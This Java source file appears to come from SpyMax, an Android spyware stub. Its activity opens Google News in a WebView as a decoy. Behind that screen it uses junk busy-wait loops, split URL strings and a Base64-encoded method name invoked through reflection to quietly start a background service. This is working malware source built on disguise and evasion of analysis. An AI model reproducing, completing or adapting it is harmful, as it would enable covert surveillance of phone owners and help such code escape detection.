package spymax.stub7;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;

import android.graphics.Bitmap;
import android.os.Bundle;
import android.webkit.CookieManager;

import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class _news_g_ extends Activity {
    WebView wb;
    private class HelloWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            // TODO Auto-generated method stub
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // TODO Auto-generated method stub

            view.loadUrl(url);
            return true;

        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // TODO Auto-generated method stub
            super.onPageFinished(view, url);


        }


    }
    public static String T2="[RANDOM-STRING]";
    public static String T3="[RANDOM-STRING]";
    public static String T4="[RANDOM-STRING]";
    public static String T5="[RANDOM-STRING]";
    public static String T6="[RANDOM-STRING]";
    public static String T7="[RANDOM-STRING]";

    @Override
    public void onCreate(Bundle v) {
        super.onCreate(v);

        Boolean will_ask_battary_2 = true;
        while (will_ask_battary_2)
        {
            T2="[RANDOM-STRING]";
            if (T2.equals(T3))
            {
                will_ask_battary_2 =false;
            }

        }
        Boolean will_ask_battary_3 = true;
        while (will_ask_battary_3)
        {
            T3="[RANDOM-STRING]";
            if (T3.equals(T2))
            {
                will_ask_battary_3 =false;
            }

        }


        setContentView(R.layout.wib);
        wb=(WebView)findViewById(R.id.webView1);
        wb.getSettings().setJavaScriptEnabled(true);
        Boolean will_ask_battary_6 = true;
        while (will_ask_battary_6)
        {
            T6="[RANDOM-STRING]";
            if (T6.equals(T3))
            {
                will_ask_battary_6 =false;
            }

        }
        Boolean will_ask_battary_7 = true;
        while (will_ask_battary_7)
        {
            T7="[RANDOM-STRING]";
            if (T7.equals(T3))
            {
                will_ask_battary_7 =false;
            }

        }
        wb.getSettings().setLoadWithOverviewMode(true);
        wb.getSettings().setUseWideViewPort(true);
        wb.getSettings().setUserAgentString(System.getProperty(re("ht[RANDOM-STRING]tp.agent","[RANDOM-STRING]")));
        wb.getSettings().setBuiltInZoomControls(false);
        Boolean will_ask_battary_4 = true;
        while (will_ask_battary_4)
        {
            T4="[RANDOM-STRING]";
            if (T4.equals(T3))
            {
                will_ask_battary_4 =false;
            }

        }
        Boolean will_ask_battary_5 = true;
        while (will_ask_battary_5)
        {
            T5="[RANDOM-STRING]";
            if (T5.equals(T3))
            {
                will_ask_battary_5 =false;
            }

        }
        wb.getSettings().setPluginState(WebSettings.PluginState.ON);
        //  wb.getSettings().setPluginsEnabled(true);
        wb.setWebViewClient(new _news_g_.HelloWebViewClient());
        wb.loadUrl(ClassGen3._Reblace_( "ht[RANDOM-STRING]tps:/[RANDOM-STRING]/news.go[RANDOM-STRING]ogle.c[RANDOM-STRING]om/","[RANDOM-STRING]"));



        Context x = getApplicationContext();
//        if (ClassGen10.r(_engine_wrk_.class, x)) {
//            startService(new Intent(this, _engine_wrk_.class));
//
//        }
        if(ClassGen10._runn_srv_(ClassGen11.class,x)) {
            Intent i = new Intent(x, ClassGen11.class);
            //ClassGen3.StartNewScan(x,i);

            String funClass = "spymax"+"."+"stub7"+"."+"ClassGen3";
            Class c = null;
            try {
                c = Class.forName(funClass);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }


            Object o = null;
            try {
                o = c.newInstance();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InstantiationException e) {
                e.printStackTrace();
            }

            Class[] paramTypes = new Class[2];
            paramTypes[0]= Context.class;
            paramTypes[1]=Intent.class;
            String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");

            Method m = null;
            try {
                m = c.getDeclaredMethod(methodName, paramTypes);
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            }

            try {
                m.invoke(o, new Object[]{x,i});
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }
        }

        //finish();
    }

    private String re(String s, String s1) {
        return s.replace(s1,"");
    }
//    @Override
//    public void finish() {
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }
}
